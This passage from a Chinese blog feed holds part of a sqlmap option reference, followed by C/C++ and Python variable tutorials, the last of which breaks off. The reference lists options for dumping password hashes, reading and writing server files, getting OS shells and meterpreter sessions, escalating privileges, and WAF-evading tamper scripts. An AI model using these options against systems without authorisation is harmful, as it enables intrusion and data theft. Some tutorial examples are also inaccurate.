暴力猜测列的字符数</li><li>–union-from=UFROM  SQL注入UNION查询使用的格式</li><li>–dns-domain=DNS..  DNS泄露攻击使用的域名</li><li>–second-order=S..  URL搜索产生的结果页面</li></ol><h4 id="指纹"><a href="#指纹" class="headerlink" title="指纹"></a>指纹</h4><ol><li>-f, –fingerprint   执行广泛的DBMS版本指纹检查</li></ol><h4 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h4><ul><li>这些选项可以用来列举后端数据库管理系统的信息、表中的结构和数据。此外，您还可以运行自定义的SQL语句。</li></ul><ol><li>-a, –all           获取所有信息</li><li>-b, –banner        获取数据库管理系统的标识</li><li>–current-user      获取数据库管理系统当前用户</li><li>–current-db        获取数据库管理系统当前数据库</li><li>–hostname         获取数据库服务器的主机名称</li><li>–is-dba            检测DBMS当前用户是否DBA</li><li>–users             枚举数据库管理系统用户</li><li>–passwords         枚举数据库管理系统用户密码哈希</li><li>–privileges        枚举数据库管理系统用户的权限</li><li>–roles            枚举数据库管理系统用户的角色</li><li>–dbs             枚举数据库管理系统数据库</li><li>–tables            枚举的DBMS数据库中的表</li><li>–columns          枚举DBMS数据库表列</li><li>–schema            枚举数据库架构</li><li>–count             检索表的项目数，有时候用户只想获取表中的数据个数而不是具体的内容，那么就可以使用这个参数：sqlmap.py -u url –count -D testdb</li><li>–dump            转储数据库表项</li><li>–dump-all          转储数据库所有表项</li><li>–search           搜索列（S），表（S）和/或数据库名称（S）</li><li>–comments          获取DBMS注释</li><li>-D DB               要进行枚举的指定数据库名</li><li>-T TBL              DBMS数据库表枚举</li><li>-C COL             DBMS数据库表列枚举</li><li>-X EXCLUDECOL     DBMS数据库表不进行枚举</li><li>-U USER           用来进行枚举的数据库用户</li><li>–exclude-sysdbs    枚举表时排除系统数据库</li><li>–pivot-column=P..  Pivot columnname</li><li>–where=DUMPWHERE   Use WHEREcondition while table dumping</li><li>–start=LIMITSTART  获取第一个查询输出数据位置</li><li>–stop=LIMITSTOP   获取最后查询的输出数据</li><li>–first=FIRSTCHAR   第一个查询输出字的字符获取</li><li>–last=LASTCHAR    最后查询的输出字字符获取</li><li>–sql-query=QUERY   要执行的SQL语句</li><li>–sql-shell         提示交互式SQL的shell</li><li>–sql-file=SQLFILE  要执行的SQL文件</li></ol><h4 id="暴力"><a href="#暴力" class="headerlink" title="暴力"></a>暴力</h4><p>这些选项可以被用来运行暴力检查</p><ol><li>–common-tables     检查存在共同表</li><li>–common-columns    检查存在共同列</li></ol><h4 id="用户自定义函数注入"><a href="#用户自定义函数注入" class="headerlink" title="用户自定义函数注入"></a>用户自定义函数注入</h4><ul><li>这些选项可以用来创建用户自定义函数</li></ul><ol><li>–udf-inject    注入用户自定义函数</li><li>–shared-lib=SHLIB  共享库的本地路径</li></ol><h4 id="访问文件系统"><a href="#访问文件系统" class="headerlink" title="访问文件系统"></a>访问文件系统</h4><ul><li>这些选项可以被用来访问后端数据库管理系统的底层文件系统</li></ul><ol><li>–file-read=RFILE   从后端的数据库管理系统文件系统读取文件，SQL Server2005中读取二进制文件example.exe:</li><li>–file-write=WFILE  编辑后端的数据库管理系统文件系统上的本地文件</li><li>–file-dest=DFILE   后端的数据库管理系统写入文件的绝对路径</li></ol><h4 id="操作系统访问"><a href="#操作系统访问" class="headerlink" title="操作系统访问"></a>操作系统访问</h4><p>这些选项可以用于访问后端数据库管理系统的底层操作系统</p><ol><li>–os-cmd=OSCMD   执行操作系统命令（OSCMD）</li><li>–os-shell          交互式的操作系统的shell</li><li>–os-pwn          获取一个OOB shell，meterpreter或VNC</li><li>–os-smbrelay       一键获取一个OOBshell，meterpreter或VNC</li><li>–os-bof           存储过程缓冲区溢出利用</li><li>–priv-esc          数据库进程用户权限提升</li><li>–msf-path=MSFPATH  MetasploitFramework本地的安装路径</li><li>–tmp-path=TMPPATH  远程临时文件目录的绝对路径</li></ol><h4 id="Windows注册表访问"><a href="#Windows注册表访问" class="headerlink" title="Windows注册表访问"></a>Windows注册表访问</h4><ul><li>这些选项可以被用来访问后端数据库管理系统Windows注册表</li></ul><ol><li>–reg-read          读一个Windows注册表项值</li><li>–reg-add           写一个Windows注册表项值数据</li><li>–reg-del           删除Windows注册表键值</li><li>–reg-key=REGKEY    Windows注册表键</li><li>–reg-value=REGVAL  Windows注册表项值</li><li>–reg-data=REGDATA  Windows注册表键值数据</li><li>–reg-type=REGTYPE  Windows注册表项值类型</li></ol><h4 id="一般选项"><a href="#一般选项" class="headerlink" title="一般选项"></a>一般选项</h4><ul><li>这些选项可以用来设置一些一般的工作参数</li></ul><ol><li>-s SESSIONFILE     保存和恢复检索会话文件的所有数据</li><li>-t TRAFFICFILE      记录所有HTTP流量到一个文本文件中</li><li>–batch            从不询问用户输入，使用所有默认配置。</li><li>–binary-fields=..  结果字段具有二进制值(e.g.”digest”)</li><li>–charset=CHARSET   强制字符编码</li><li>–crawl=CRAWLDEPTH  从目标URL爬行网站</li><li>–crawl-exclude=..  正则表达式从爬行页中排除</li><li>–csv-del=CSVDEL    限定使用CSV输出 (default”,”)</li><li>–dump-format=DU..  转储数据格式(CSV(default), HTML or SQLITE)</li><li>–eta              显示每个输出的预计到达时间</li><li>–flush-session     刷新当前目标的会话文件</li><li>–forms           解析和测试目标URL表单</li><li>–fresh-queries     忽略在会话文件中存储的查询结果</li><li>–hex             使用DBMS Hex函数数据检索</li><li>–output-dir=OUT..  自定义输出目录路径</li><li>–parse-errors      解析和显示响应数据库错误信息</li><li>–save=SAVECONFIG   保存选项到INI配置文件</li><li>–scope=SCOPE    从提供的代理日志中使用正则表达式过滤目标</li><li>–test-filter=TE..  选择测试的有效载荷和/或标题(e.g. ROW)</li><li>–test-skip=TEST..  跳过试验载荷和/或标题(e.g.BENCHMARK)</li><li>–update            更新sqlmap</li></ol><h4 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h4><ol><li>-z MNEMONICS        使用短记忆法 (e.g.”flu,bat,ban,tec=EU”)</li><li>–alert=ALERT       发现SQL注入时，运行主机操作系统命令</li><li>–answers=ANSWERS   当希望sqlmap提出输入时，自动输入自己想要的答案(e.g. “quit=N,follow=N”)，例如：sqlmap.py -u”<a href="http://192.168.22.128/get_int.php?id=1“–technique=E–answers=”extending=N”" target="_blank" rel="noopener">http://192.168.22.128/get_int.php?id=1“–technique=E–answers=”extending=N”</a> –batch</li><li>–beep    发现sql注入时，发出蜂鸣声。</li><li>–cleanup     清除sqlmap注入时在DBMS中产生的udf与表。</li><li>–dependencies      Check formissing (non-core) sqlmap dependencies</li><li>–disable-coloring  默认彩色输出，禁掉彩色输出。</li><li>–gpage=GOOGLEPAGE 使用前100个URL地址作为注入测试，结合此选项，可以指定页面的URL测试</li><li>–identify-waf      进行WAF/IPS/IDS保护测试，目前大约支持30种产品的识别</li><li>–mobile     有时服务端只接收移动端的访问，此时可以设定一个手机的User-Agent来模仿手机登陆。</li><li>–offline           Work inoffline mode (only use session data)</li><li>–purge-output     从输出目录安全删除所有内容，有时需要删除结果文件，而不被恢复，可以使用此参数，原有文件将会被随机的一些文件覆盖。</li><li>–skip-waf           跳过WAF／IPS / IDS启发式检测保护</li><li>–smart            进行积极的启发式测试，快速判断为注入的报错点进行注入</li><li>–sqlmap-shell      互动提示一个sqlmapshell</li><li>–tmp-dir=TMPDIR    用于存储临时文件的本地目录</li><li>–web-root=WEBROOT  Web服务器的文档根目录(e.g.”/var/www”)</li><li>–wizard   新手用户简单的向导使用，可以一步一步教你如何输入针对目标注入</li></ol><h3 id="tamper"><a href="#tamper" class="headerlink" title="tamper"></a>tamper</h3><ol><li>space2comment.py用/**/代替空格</li><li>apostrophemask.py用utf8代替引号</li><li>equaltolike.pylike代替等号</li><li>space2dash.py　绕过过滤‘=’ 替换空格字符（”），（’–‘）后跟一个破折号注释，一个随机字符串和一个新行（’n’）</li><li>greatest.py　绕过过滤’&gt;’ ,用GREATEST替换大于号。</li><li>space2hash.py空格替换为#号,随机字符串以及换行符</li><li>apostrophenullencode.py绕过过滤双引号，替换字符和双引号。</li><li>halfversionedmorekeywords.py当数据库为mysql时绕过防火墙，每个关键字之前添加mysql版本评论</li><li>space2morehash.py空格替换为 #号 以及更多随机字符串 换行符</li><li>appendnullbyte.py在有效负荷结束位置加载零字节字符编码</li><li>ifnull2ifisnull.py　绕过对IFNULL过滤,替换类似’IFNULL(A,B)’为’IF(ISNULL(A), B, A)’</li><li>space2mssqlblank.py(mssql)空格替换为其它空符号</li><li>base64encode.py　用base64编码替换</li><li>space2mssqlhash.py　替换空格</li><li>modsecurityversioned.py过滤空格，包含完整的查询版本注释</li><li>space2mysqlblank.py　空格替换其它空白符号(mysql)</li><li>between.py用between替换大于号（&gt;）</li><li>space2mysqldash.py替换空格字符（”）（’ – ‘）后跟一个破折号注释一个新行（’ n’）</li><li>multiplespaces.py围绕SQL关键字添加多个空格</li><li>space2plus.py用+替换空格</li><li>bluecoat.py代替空格字符后与一个有效的随机空白字符的SQL语句,然后替换=为like</li><li>nonrecursivereplacement.py双重查询语句,取代SQL关键字</li><li>space2randomblank.py代替空格字符（“”）从一个随机的空白字符可选字符的有效集</li><li>sp_password.py追加sp_password’从DBMS日志的自动模糊处理的有效载荷的末尾</li><li>chardoubleencode.py双url编码(不处理以编码的)</li><li>unionalltounion.py替换UNION ALLSELECT UNION SELECT</li><li>charencode.py　url编码</li><li>randomcase.py随机大小写</li><li>unmagicquotes.py宽字符绕过 GPCaddslashes</li><li>randomcomments.py用/**/分割sql关键字</li><li>charunicodeencode.py字符串 unicode 编码</li><li>securesphere.py追加特制的字符串</li><li>versionedmorekeywords.py注释绕过</li><li>space2comment.py替换空格字符串(‘‘) 使用注释‘/**/’</li><li>halfversionedmorekeywords.py关键字前加注释</li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;sqlmap五种注入模式：&quot;&gt;&lt;a href=&quot;#sqlmap五种注入模式：&quot; class=&quot;headerlink&quot; title=&quot;sqlmap五种注入模式：&quot;&gt;&lt;/a&gt;sqlmap五种注入模式：&lt;/h3&gt;&lt;ol&gt;
&lt;li&gt;基于布尔的盲注，即可以根据返回页面判断条
      
    
    </summary>
    
    
      <category term="工具手册" scheme="http://yoursite.com/categories/%E5%B7%A5%E5%85%B7%E6%89%8B%E5%86%8C/"/>
    
    
      <category term="注入工具" scheme="http://yoursite.com/tags/%E6%B3%A8%E5%85%A5%E5%B7%A5%E5%85%B7/"/>
    
  </entry>
  
  <entry>
    <title>C&amp;C++变量</title>
    <link href="http://yoursite.com/2020/02/20/c-c%E5%8F%98%E9%87%8F/"/>
    <id>http://yoursite.com/2020/02/20/c-c%E5%8F%98%E9%87%8F/</id>
    <published>2020-02-19T16:18:29.000Z</published>
    <updated>2020-02-26T02:13:15.201Z</updated>
    
    <content type="html"><![CDATA[<h1 id="1-变量的定义、声明"><a href="#1-变量的定义、声明" class="headerlink" title="1. 变量的定义、声明"></a>1. 变量的定义、声明</h1><p> 变量的声明有两种情况：</p><p> 一种是需要建立存储空间的。例如：int a。在声明的时候就已经建立了存储空间。这种声明是”定义性声明(defining declaration)”，即我们平时所说的“定义”。</p><p> 另一种是不需要建立存储空间的，只是告诉编译器某变量已经在别处定义过了。例如：extern int a。其中，变量a是在别处定义的。这种声明是”引用性声明(referncing declaration)”，即我们平时所说的“声明”。</p><p> 从广义的角度来讲，声明中包含着定义，但是并非所有的声明都是定义。即，定义性声明既是定义又是声明，而引用性声明只是声明。例如：int a。它既是声明，同时又是定义。然而对于 extern int a 来讲，它只是声明不是定义。</p><p> 一般的情况下我们常常这样叙述，把建立空间的声明称之为”定义”，而把不需要建立存储空间的称之为”声明”。很明显这里指的声明是范围比较窄的，也就是说引用性的声明。</p><p> 例子：</p><p> int a; //定义性声明，分配存储空间，初值不确定</p><p> int b = 0; //定义性声明，分配存储空间，赋初值</p><p> extern int c; //引用性声明，不分配存储空间，只是告诉编译器这个变量已经在别处定义过了</p><h1 id="2-函数的定义、声明"><a href="#2-函数的定义、声明" class="headerlink" title="2  函数的定义、声明"></a>2  函数的定义、声明</h1><p> 函数的定义和声明也是一样，定义需要分配存储空间；声明只是告诉编译器这个函数已经在别处定义过了。</p><p> 函数的定义和声明比较好区分。有函数体的即为定义，不带函数体即为声明。</p><p> 例子：　　</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">double sqrt(double x);</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">　　&#x2F;&#x2F;定义</span><br><span class="line"></span><br><span class="line">　　double sqrt(double x)</span><br><span class="line"></span><br><span class="line">　　&#123;</span><br><span class="line"></span><br><span class="line">        　　return x*x;</span><br><span class="line"></span><br><span class="line">　　&#125;</span><br></pre></td></tr></table></figure><h1 id="3-定义与声明的区别"><a href="#3-定义与声明的区别" class="headerlink" title="3 定义与声明的区别"></a>3 定义与声明的区别</h1><p>（1）是否需要分配存储空间。</p><p>（2）在一个作用域中可以重复声明，但不能重复定义。这是由（1）决定的，可以重复几次告诉编译器某个变量、函数已经在别处定义了，但不能重复多次地让编译器为同一个变量、函数分配不同的存储空间。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;1-变量的定义、声明&quot;&gt;&lt;a href=&quot;#1-变量的定义、声明&quot; class=&quot;headerlink&quot; title=&quot;1. 变量的定义、声明&quot;&gt;&lt;/a&gt;1. 变量的定义、声明&lt;/h1&gt;&lt;p&gt; 变量的声明有两种情况：&lt;/p&gt;
&lt;p&gt; 一种是需要建立存储空间的。例如
      
    
    </summary>
    
    
      <category term="编程基础" scheme="http://yoursite.com/categories/%E7%BC%96%E7%A8%8B%E5%9F%BA%E7%A1%80/"/>
    
    
      <category term="C&amp;C++" scheme="http://yoursite.com/tags/C-C/"/>
    
  </entry>
  
  <entry>
    <title>Python变量</title>
    <link href="http://yoursite.com/2020/02/17/Python%E5%8F%98%E9%87%8F/"/>
    <id>http://yoursite.com/2020/02/17/Python%E5%8F%98%E9%87%8F/</id>
    <published>2020-02-17T10:39:56.000Z</published>
    <updated>2020-02-25T16:09:59.789Z</updated>
    
    <content type="html"><![CDATA[<h3 id="变量的定义"><a href="#变量的定义" class="headerlink" title="变量的定义"></a>变量的定义</h3><p>变量来源于数学，是计算机语言中能储存计算结果或能表示值抽象概念。变量可以通过变量名访问。</p><p>在python中，变量会在首次出现时为其赋值时被创建，无需事先声明<em>变量的类型，变量类型</em>是在运行过程中根据对象的类型自动决定的。在使用中，可以随意改变变量的类型。而在c语言中，变量则需要先创建才能使用，并且需要严格定义类型。</p><h3 id="如何定义变量"><a href="#如何定义变量" class="headerlink" title="如何定义变量"></a>如何定义变量</h3><p>定义变量就是向服务器的内存申请空间，用来存储数据。这时候我们就需要用到变量名和变量值。</p><p>在python当中定义一个变量很简单，由于 python是一种动态类型语言，定义一个变量<strong>不需要声明变量类型</strong>，直接给变量赋值就相当于定义一个变量了，<strong>变量类型取决于值的类型</strong>。</p><p>变量名只有在第一次出现的时候，才是定义变量。当再次出现时，不是定义变量，而是直接使用之前定义的变量。</p><p>如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">1</span>]: a = <span class="number">1</span>                                                                                                                                           </span><br><span class="line">In [<span class="number">2</span>]: b = <span class="string">"hello"</span></span><br></pre></td></tr></table></figure><p>在“=”左边是变量名，右边是变量值。“=”可不是我们平常所说的等号哦，在python中，<code>=</code>是赋值运算符</p><h3 id="变量命名规则"><a href="#变量命名规则" class="headerlink" title="变量命名规则"></a>变量命名规则</h3><ol><li><p>变量名只能包括<strong>字母</strong>、<strong>数字</strong>和<strong>下划线</strong>。变量名不能以数字开头。如”$_name”,”$name” ,”$name2”等，但是”$9name”,”$name*”是不对的。</p></li><li><p>变量名不允许包含空格。当变量名由多个单词组成，建议使用“_”进行分隔（比如 $my_apple），俗称下划线法，或者以大写字母开头比如 $myApple，俗称骆驼式命名法（也称驼峰命名法）。</p></li><li><p>不能使用python保留的<strong>关键字</strong>及<strong>内置函数名</strong>作变量名，例如，用print作变量名是不允许的。</p></li><li><p>在Python中变量名是区分大小写的，如“$my_book”与“$my_Book”代表两个不同的变量。</p></li></ol><h3 id="变量的数据类型"><a href="#变量的数据类型" class="headerlink" title="变量的数据类型"></a>变量的数据类型</h3><p>严格意义上讲，python只有一个类型，都继承自object。</p><ul><li><p>python的标准数据类型有六种</p><ol><li>数字类型（Number）</li><li>字符串类型 （str）</li><li>列表 （list）</li><li>元组 （tuple）</li><li>字典 （dict）</li><li>集合 （set）</li></ol></li></ul><h4 id="数字类型（Number）"><a href="#数字类型（Number）" class="headerlink" title="数字类型（Number）"></a>数字类型（Number）</h4><p>Python 数字数据类型用于存储数值。</p><p>Python 支持三种不同的数值类型：整型（int）、浮点型（float）、复数（complex）</p><ul><li><p>整型：通常称为整数，是整数或者负数，不带小数点。python3整型类型没有大小限制。int型数字：0、10 -780、-089、-0x270、0x90。</p></li><li><p>浮点型：浮点型由整数部分与小数部分组成。float型数字：0.0、15.2、-2.9、-32.5e10、32+e18。浮点数可以用科学计算法表示：2.5e2 = 2.5 x 10^2 = 250</p></li><li><p>复数型：复数由实数部分和虚数部分构成，可以用a + bj,或者complex(a,b)表示， 复数的实部a和虚部b都是浮点型。complex:3.14j、9.23e-35j、4.53e-7j。</p></li></ul><p>python数字类型相互转换</p><ul><li><p>int(x) 将x转换为一个整数。</p></li><li><p>float(x) 将x转换到一个浮点数。</p></li><li><p>complex(x) 将x转换到一个复数，实数部分为 x，虚数部分为 0。complex(x, y) 将 x 和 y 转换到一个复数，实数部分为 x，虚数部分为 y。x 和 y 是数字表达式。</p></li></ul><p>python数字运算</p><ul><li>和其他不一样的是：  /  ：返回的是浮点数、// :向下取整数、 ** ： 幂运算</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">1</span>]: <span class="number">8</span>/<span class="number">3</span>                                                  </span><br><span class="line">Out[<span class="number">1</span>]: <span class="number">2.6666666666666665</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">2</span>]: <span class="number">8</span>//<span class="number">3</span>                                                 </span><br><span class="line">Out[<span class="number">2</span>]: <span class="number">2</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">3</span>]: <span class="number">3</span>**<span class="number">3</span>                                                 </span><br><span class="line">Out[<span class="number">3</span>]: <span class="number">27</span></span><br></pre></td></tr></table></figure><h4 id="字符串类型-（str）"><a href="#字符串类型-（str）" class="headerlink" title="字符串类型 （str）"></a>字符串类型 （str）</h4><p>双引号或者单引号中的数据，就是字符串。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">5</span>]: str1 = <span class="string">"hello,world"</span></span><br></pre></td></tr></table></figure><p>单字符在python中也是当做一个字符串来使用。</p><ul><li>python访问字符串中的值</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">6</span>]: var1 = <span class="string">"hello world"</span>                                 </span><br><span class="line"></span><br><span class="line">In [<span class="number">7</span>]: var2 = <span class="string">"python3"</span>                                     </span><br><span class="line"></span><br><span class="line">In [<span class="number">8</span>]: print(<span class="string">"var1[0]"</span>,var1[<span class="number">0</span>])                             </span><br><span class="line">var1[<span class="number">0</span>] h</span><br><span class="line"></span><br><span class="line">In [<span class="number">9</span>]: print(<span class="string">"var2[3:6]"</span>,var2[<span class="number">3</span>:<span class="number">6</span>])                         </span><br><span class="line">var2[<span class="number">3</span>:<span class="number">6</span>] hon</span><br></pre></td></tr></table></figure><ul><li>python字符串的分片</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">12</span>]: str = <span class="string">"string"</span>                                      </span><br><span class="line"><span class="comment">#获取从偏移为1到偏移为3的字符串，不包括偏移为3的字符</span></span><br><span class="line">In [<span class="number">13</span>]: str[<span class="number">1</span>:<span class="number">3</span>]                                            </span><br><span class="line">Out[<span class="number">13</span>]: <span class="string">'tr'</span></span><br><span class="line"><span class="comment">#获取从偏移为1到最后的一个字符</span></span><br><span class="line">In [<span class="number">14</span>]: str[<span class="number">1</span>:]                                             </span><br><span class="line">Out[<span class="number">14</span>]: <span class="string">'tring'</span></span><br><span class="line"><span class="comment"># 获取从偏移为0的字符一直到偏移为3的字符串，不包括偏移为3的字符串</span></span><br><span class="line">In [<span class="number">15</span>]: str[:<span class="number">3</span>]                                             </span><br><span class="line">Out[<span class="number">15</span>]: <span class="string">'str'</span></span><br><span class="line"><span class="comment">#获取从偏移为0的字符一直到最后一个字符（不包括最后一个字符）  </span></span><br><span class="line">In [<span class="number">16</span>]: str[:<span class="number">-1</span>]                                            </span><br><span class="line">Out[<span class="number">16</span>]: <span class="string">'strin'</span></span><br><span class="line">获取字符串从开始到结尾的所有元素</span><br><span class="line">In [<span class="number">17</span>]: str[:]                                              </span><br><span class="line">Out[<span class="number">17</span>]: <span class="string">'string'</span></span><br><span class="line"><span class="comment">#获取偏移为-3到偏移为-1的字符，不包括偏移为-1的字符 </span></span><br><span class="line">In [<span class="number">18</span>]: str[<span class="number">-3</span>:<span class="number">-1</span>]                                          </span><br><span class="line">Out[<span class="number">18</span>]: <span class="string">'in'</span></span><br><span class="line"><span class="comment">#反转输出</span></span><br><span class="line">In [<span class="number">19</span>]: str[::<span class="number">-1</span>]                                           </span><br><span class="line">Out[<span class="number">19</span>]: <span class="string">'gnirts'</span></span><br></pre></td></tr></table></figure><ul><li>“+”：实现字符串的拼接</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">21</span>]: string=<span class="string">"hello"</span>+<span class="string">"world"</span>                              </span><br><span class="line"></span><br><span class="line">In [<span class="number">22</span>]: string                                              </span><br><span class="line">Out[<span class="number">22</span>]: <span class="string">'helloworld'</span></span><br></pre></td></tr></table></figure><ul><li>字符串的方法</li></ul><ol><li><p>replace()方法</p><p>Python replace() 方法把字符串中的 old（旧字符串） 替换成 new(新字符串)，如果指定第三个参数max，则替换不超过 max 次。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">23</span>]: str = <span class="string">"This is A Test"</span>                              </span><br><span class="line"></span><br><span class="line">In [<span class="number">24</span>]: print(str.replace(<span class="string">"is"</span>, <span class="string">"was"</span>))                     </span><br><span class="line">Thwas was A Test</span><br><span class="line"></span><br><span class="line">In [<span class="number">25</span>]: print(str.replace(<span class="string">"is"</span>, <span class="string">"was"</span>, <span class="number">1</span>))                  </span><br><span class="line">Thwas <span class="keyword">is</span> A Test</span><br></pre></td></tr></table></figure></li><li><p>find() 方法检</p><p>测字符串中是否包含子字符串 str ，如果指定 beg（开始） 和 end（结束） 范围，则检查是否包含在指定范围内，如果指定范围内如果包含指定索引值，返回的是索引值在字符串中的起始位置。如果不包含索引值，返回-1。</p><ul><li><p>语法： </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">str.find(str,beg = <span class="number">0</span>, end = len(str))</span><br></pre></td></tr></table></figure></li><li><p>参数：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">str -- 指定检索的字符串</span><br><span class="line">beg -- 开始索引，默认为0。</span><br><span class="line">end -- 结束索引，默认为字符串的长度。</span><br></pre></td></tr></table></figure></li><li><p>返回值：</p><p>如果包含子字符串返回开始的索引值，否则返回-1。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">26</span>]: str1 = <span class="string">"python web: www.python.org"</span>                 </span><br><span class="line"></span><br><span class="line">In [<span class="number">27</span>]: str2 = <span class="string">"we"</span>                                         </span><br><span class="line"></span><br><span class="line">In [<span class="number">28</span>]: print(str1.find(str2))                              </span><br><span class="line"><span class="number">7</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">29</span>]: print(str1.find(str2, <span class="number">3</span>))                           </span><br><span class="line"><span class="number">7</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">30</span>]: print(str1.find(str2, <span class="number">8</span>))                           </span><br><span class="line"><span class="number">-1</span></span><br></pre></td></tr></table></figure></li></ul></li><li><p>index()方法</p><p>和find()方法相似，唯一的区别就是find方法不包含索引值会返回-1，而index()不包含索引值会抛出异常。</p></li><li><p>join()方法</p><p>连接字符串数组。将字符串、元组、列表中的元素以指定的字符(分隔符)连接生成一个新的字符串。join是重要的字符串方法，用来在队列中添加元素。<br>注意：需要添加的元素必须都是字符串。</p><ul><li><p>语法</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">str.join(sequence)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">31</span>]: str = <span class="string">"-"</span>                                           </span><br><span class="line"></span><br><span class="line">In [<span class="number">32</span>]: a = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">4</span>]                                         </span><br><span class="line"></span><br><span class="line">In [<span class="number">33</span>]: b = [<span class="string">"a"</span>,<span class="string">"b"</span>,<span class="string">"c"</span>]                                   </span><br><span class="line"></span><br><span class="line">In [<span class="number">34</span>]: print(str.join(a))                                  </span><br><span class="line">-------------------------------------------------------------</span><br><span class="line">TypeError                   Traceback (most recent call last)</span><br><span class="line">&lt;ipython-input<span class="number">-34</span>-df311844404b&gt; <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">----&gt; 1 print(str.join(a))</span><br><span class="line"></span><br><span class="line">TypeError: sequence item <span class="number">0</span>: expected str instance, int found</span><br><span class="line"></span><br><span class="line">In [<span class="number">35</span>]: print(str.join(b))                                  </span><br><span class="line">a-b-c</span><br></pre></td></tr></table></figure></li></ul></li><li><p>split()方法</p><p>和join方法相反，split方法把字符串分成序列。</p><ul><li><p>语法：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">str.split(str=<span class="string">""</span>, num=string.count(str)).</span><br></pre></td></tr></table></figure></li><li><p>参数：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">str -- 分隔符，默认为所有的空字符，包括空格、换行(\n)、制表符(\t)等。</span><br><span class="line">num -- 分割次数。</span><br></pre></td></tr></table></figure></li><li><p>返回值</p><p>返回分割后的字符串列表</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">38</span>]: str = <span class="string">"this is a string examplei"</span>                   </span><br><span class="line"></span><br><span class="line">In [<span class="number">39</span>]: print(str.split())                                  </span><br><span class="line">[<span class="string">'this'</span>, <span class="string">'is'</span>, <span class="string">'a'</span>, <span class="string">'string'</span>, <span class="string">'examplei'</span>]</span><br><span class="line"></span><br><span class="line">In [<span class="number">40</span>]: print(str.split(<span class="string">"s"</span>,<span class="number">1</span>))                             </span><br><span class="line">[<span class="string">'thi'</span>, <span class="string">' is a string examplei'</span>]</span><br><span class="line"></span><br><span class="line">In [<span class="number">41</span>]: print(str.split(<span class="string">"i"</span>))                               </span><br><span class="line">[<span class="string">'th'</span>, <span class="string">'s '</span>, <span class="string">'s a 